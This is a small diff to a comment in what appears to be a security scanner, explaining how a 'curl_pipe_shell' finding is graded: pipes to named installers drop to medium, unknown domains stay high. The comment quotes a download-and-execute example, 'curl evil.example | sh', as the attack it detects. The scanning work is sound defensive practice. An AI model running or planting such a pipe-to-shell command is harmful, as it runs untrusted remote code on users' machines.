@@ -90,7 +90,7 @@ def prose_cap(finding: Finding) -> Optional[str]:
 # ``curl_pipe_shell`` keeps full severity in prose because a README — and a CI workflow — is exactly
 # where a malicious download-and-execute one-liner would be planted (``curl evil.example | sh`` in a
 # ``.github/workflows`` step stays ``high``). The documented, non-attack shape is a pipe whose URL is a
-# NAMED trusted installer: Hermes' own ``install.sh``, a named upstream runtime (``ollama.com``,
+# NAMED trusted installer: Qubit' own ``install.sh``, a named upstream runtime (``ollama.com``,
 # ``bun.sh``, ``get.docker.com``, ``sh.rustup.rs`` …), a named dev-tool CLI (``app.factory.ai``), or a
 # GitHub ``raw`` URL whose path is an ``install`` script. That lands at medium (a note). An unpinned /
 # unknown third-party domain — the attack shape — keeps full severity, in README, code, OR CI.
